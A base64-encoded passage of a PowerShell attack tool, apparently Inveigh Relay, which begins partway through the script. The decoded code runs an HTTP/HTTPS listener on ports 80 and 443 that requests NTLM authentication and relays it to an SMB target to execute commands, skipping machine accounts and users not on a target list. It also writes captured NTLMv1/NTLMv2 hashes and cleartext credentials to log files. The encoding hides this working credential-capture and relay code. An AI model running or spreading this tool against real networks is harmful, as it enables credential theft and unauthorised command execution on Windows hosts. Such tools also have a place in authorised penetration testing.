VFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHRvIFNNQiByZWxheSBhdXRoZW50aWNhdGlvbiBmYWlsZWQgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0ICs9ICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyAkU01CUmVsYXlUYXJnZXQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIk5UTE12MSBTTUIgcmVsYXkgbm90IHlldCBzdXBwb3J0ZWQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBOVExNdjEgcmVsYXkgbm90IHlldCBzdXBwb3J0ZWQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiQWJvcnRpbmcgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaGFzIGFscmVhZHkgYmVlbiB0cmllZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEFib3J0aW5nIHJlbGF5IHNpbmNlICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGhhcyBhbHJlYWR5IGJlZW4gdHJpZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiQWJvcnRpbmcgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV91c2VyX3N0cmluZyBhcHBlYXJzIHRvIGJlIGEgbWFjaGluZSBhY2NvdW50IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEFib3J0aW5nIHJlbGF5IHNpbmNlICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgYXBwZWFycyB0byBiZSBhIG1hY2hpbmUgYWNjb3VudCIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgbm90IG9uIHJlbGF5IHVzZXJuYW1lIGxpc3QiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBub3Qgb24gcmVsYXkgdXNlcm5hbWUgbGlzdCIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE5UTE0gPSAnTlRMTScKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgIH0KICAgICAgICAKICAgICAgICBbYnl0ZVtdXSAkSFRUUF9idWZmZXIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRpbnZlaWdoLm1lc3NhZ2UpCiAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuQ29udGVudExlbmd0aDY0ID0gJEhUVFBfYnVmZmVyLmxlbmd0aAogICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLkFkZEhlYWRlcigiV1dXLUF1dGhlbnRpY2F0ZSIsJE5UTE0pCiAgICAgICAgJEhUVFBfc3RyZWFtID0gJGludmVpZ2gucmVzcG9uc2UuT3V0cHV0U3RyZWFtCiAgICAgICAgJEhUVFBfc3RyZWFtLndyaXRlKCRIVFRQX2J1ZmZlciwgMCwgJEhUVFBfYnVmZmVyLmxlbmd0aCkKICAgICAgICAkSFRUUF9zdHJlYW0uY2xvc2UoKQoKICAgIH0KCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlN0b3AoKQogICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5DbG9zZSgpCn0KCiRjb250cm9sX3JlbGF5X3NjcmlwdGJsb2NrID0gCnsKICAgIHBhcmFtICgkUnVuVGltZSkKCiAgICBpZigkUnVuVGltZSkKICAgIHsgICAgCiAgICAgICAgJGNvbnRyb2xfdGltZW91dCA9IG5ldy10aW1lc3BhbiAtTWludXRlcyAkUnVuVGltZQogICAgICAgICRjb250cm9sX3N0b3B3YXRjaCA9IFtkaWFnbm9zdGljcy5zdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICB9CiAgICAgICAKICAgIHdoaWxlICgkaW52ZWlnaC5yZWxheV9ydW5uaW5nKQogICAgewoKICAgICAgICBpZigkUnVuVGltZSkKICAgICAgICB7ICAgIAogICAgICAgICAgICBpZigkY29udHJvbF9zdG9wd2F0Y2guZWxhcHNlZCAtZ2UgJGNvbnRyb2xfdGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guSFRUUF9saXN0ZW5lci5Jc0xpc3RlbmluZykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlN0b3AoKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuQ2xvc2UoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJJbnZlaWdoIFJlbGF5IGV4aXRlZCBkdWUgdG8gcnVuIHRpbWUgYXQgJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykiKQogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBSZWxheSBleGl0ZWQgZHVlIHRvIHJ1biB0aW1lIildKQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgICAgICAgICAgICAgJGludmVpZ2gucmVsYXlfcnVubmluZyA9ICRmYWxzZQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLkhUVFBTKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICYgIm5ldHNoIiBodHRwIGRlbGV0ZSBzc2xjZXJ0IGlwcG9ydD0wLjAuMC4wOjQ0MyA+ICRudWxsCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuWDUwOUNlcnRpZmljYXRlcy5YNTA5U3RvcmUoIk15IiwiTG9jYWxNYWNoaW5lIikKICAgICAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLk9wZW4oJ1JlYWRXcml0ZScpCiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZSA9ICRjZXJ0aWZpY2F0ZV9zdG9yZS5jZXJ0aWZpY2F0ZXMuZmluZCgiRmluZEJ5VGh1bWJwcmludCIsJGludmVpZ2guY2VydGlmaWNhdGVfdGh1bWJwcmludCwkZmFsc2UpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5SZW1vdmUoJGNlcnRpZmljYXRlKQogICAgICAgICAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guc3RhdHVzX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5IikKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkifCBPdXQtRmlsZSAkSW52ZWlnaC5sb2dfb3V0X2ZpbGUgLUFwcGVuZCAgIAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSAgICAgCgogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUCA9ICRmYWxzZQogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQgLWFuZCAoISRpbnZlaWdoLnJ1bm5pbmcgLW9yICEkaW52ZWlnaC5icnV0ZWZvcmNlX3J1bm5pbmcpKQogICAgICAgIHsKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLmxvZ19vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfZmlsZV9xdWV1ZVswXXxPdXQtRmlsZSAkaW52ZWlnaC5OVExNdjFfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2ZpbGVfcXVldWVbMF18T3V0LUZpbGUgJGludmVpZ2guTlRMTXYyX291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNsZWFydGV4dF9maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLmNsZWFydGV4dF9vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jbGVhcnRleHRfZmlsZV9xdWV1ZS5SZW1vdmVSYW5nZSgwLDEpCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIFN0YXJ0LVNsZWVwIC1tIDUKICAgIH0KIH0KCiMgSFRUUC9IVFRQUyBMaXN0ZW5lciBTdGFydHVwIEZ1bmN0aW9uIApGdW5jdGlvbiBIVFRQTGlzdGVuZXIoKQp7CiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHBMaXN0ZW5lcgoKICAgIGlmKCRpbnZlaWdoLkhUVFApCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5QcmVmaXhlcy5BZGQoJ2h0dHA6Ly8qOjgwLycpCiAgICB9CgogICAgaWYoJGludmVpZ2guSFRUUFMpCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5QcmVmaXhlcy5BZGQoJ2h0dHBzOi8vKjo0NDMvJykKICAgIH0KCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLkF1dGhlbnRpY2F0aW9uU2NoZW1lcyA9ICJBbm9ueW1vdXMiIAogICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5TdGFydCgpCiAgICAkSFRUUF9ydW5zcGFjZSA9IFtydW5zcGFjZWZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkSFRUUF9ydW5zcGFjZS5PcGVuKCkKICAgICRIVFRQX3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRIVFRQX3Bvd2Vyc2hlbGwgPSBbcG93ZXJzaGVsbF06OkNyZWF0ZSgpCiAgICAkSFRUUF9wb3dlcnNoZWxsLlJ1bnNwYWNlID0gJEhUVFBfcnVuc3BhY2UKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX3JlbGF5X2NoYWxsZW5nZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJFNNQl9yZWxheV9yZXNwb25zZV9zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJFNNQl9yZWxheV9leGVjdXRlX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX05UTE1fZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkSFRUUF9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoCiAgICAgICAgJFNNQlJlbGF5VGFyZ2V0KS5BZGRBcmd1bWVudCgkU01CUmVsYXlDb21tYW5kKS5BZGRBcmd1bWVudCgkU01CUmVsYXlVc2VybmFtZXMpLkFkZEFyZ3VtZW50KAogICAgICAgICRTTUJSZWxheUF1dG9EaXNhYmxlKS5BZGRBcmd1bWVudCgkU01CUmVsYXlOZXR3b3JrVGltZW91dCkuQWRkQXJndW1lbnQoCiAgICAgICAgJE1hY2hpbmVBY2NvdW50cykuQWRkQXJndW1lbnQoJFdQQURBdXRoKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkJlZ2luSW52b2tlKCkgPiAkbnVsbAp9CgojIENvbnRyb2wgUmVsYXkgU3RhcnR1cCBGdW5jdGlvbgpGdW5jdGlvbiBDb250cm9sUmVsYXlMb29wKCkKewogICAgJGNvbnRyb2xfcmVsYXlfcnVuc3BhY2UgPSBbcnVuc3BhY2VmYWN0b3J5XTo6Q3JlYXRlUnVuc3BhY2UoKQogICAgJGNvbnRyb2xfcmVsYXlfcnVuc3BhY2UuT3BlbigpCiAgICAkY29udHJvbF9yZWxheV9ydW5zcGFjZS5TZXNzaW9uU3RhdGVQcm94eS5TZXRWYXJpYWJsZSgnaW52ZWlnaCcsJGludmVpZ2gpCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsID0gW3Bvd2Vyc2hlbGxdOjpDcmVhdGUoKQogICAgJGNvbnRyb2xfcmVsYXlfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICRjb250cm9sX3JlbGF5X3J1bnNwYWNlCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkc2hhcmVkX2Jhc2ljX2Z1bmN0aW9uc19zY3JpcHRibG9jaykgPiAkbnVsbAogICAgJGNvbnRyb2xfcmVsYXlfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJGNvbnRyb2xfcmVsYXlfc2NyaXB0YmxvY2spLkFkZEFyZ3VtZW50KCRSdW5UaW1lKSA+ICRudWxsCiAgICAkY29udHJvbF9yZWxheV9wb3dlcnNoZWxsLkJlZ2luSW52b2tlKCkgPiAkbnVsbAp9CgojIEhUVFAgU2VydmVyIFN0YXJ0CmlmKCRpbnZlaWdoLkhUVFAgLW9yICRpbnZlaWdoLkhUVFBTKQp7CiAgICBIVFRQTGlzdGVuZXIKfQoKIyBDb250cm9sIFJlbGF5IExvb3AgU3RhcnQKaWYoJFJ1blRpbWUgLW9yICRpbnZlaWdoLmZpbGVfb3V0cHV0KQp7CiAgICBDb250cm9sUmVsYXlMb29wCn0KCmlmKCEkaW52ZWlnaC5ydW5uaW5nIC1hbmQgJGludmVpZ2guY29uc29sZV9vdXRwdXQpCnsKCiAgICA6Y29uc29sZV9sb29wIHdoaWxlKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKICAgIHsKICAgICAgICB3aGlsZSgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgICAgIHsKICAgICAgICAgICAgaWYoJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB3cml0ZS1vdXRwdXQoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHN3aXRjaCAtd2lsZGNhcmQgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIkludmVpZ2ggKmV4aXRlZCAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiKiB3cml0dGVuIHRvICoiCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiKiBmb3IgcmVsYXkgKiIKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLXdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIipTTUIgcmVsYXkgKiIKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlLXdhcm5pbmcgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIiogbG9jYWwgYWRtaW5pc3RyYXRvciAqIgogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUtd2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlUmFuZ2UoMCwxKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBkZWZhdWx0CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB3cml0ZS1vdXRwdXQgJGludmVpZ2guY29uc29sZV9xdWV1ZVswXQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZVJhbmdlKDAsMSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICB9ICAgCiAgICAgICAgfQoKICAgICAgICBpZigkaW52ZWlnaC5jb25zb2xlX2lucHV0KQogICAgICAgIHsKICAgICAgICAgICAgaWYoW2NvbnNvbGVdOjpLZXlBdmFpbGFibGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAgICAgICAgICAgICBCUkVBSyBjb25zb2xlX2xvb3AKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgfQp9Cgp9
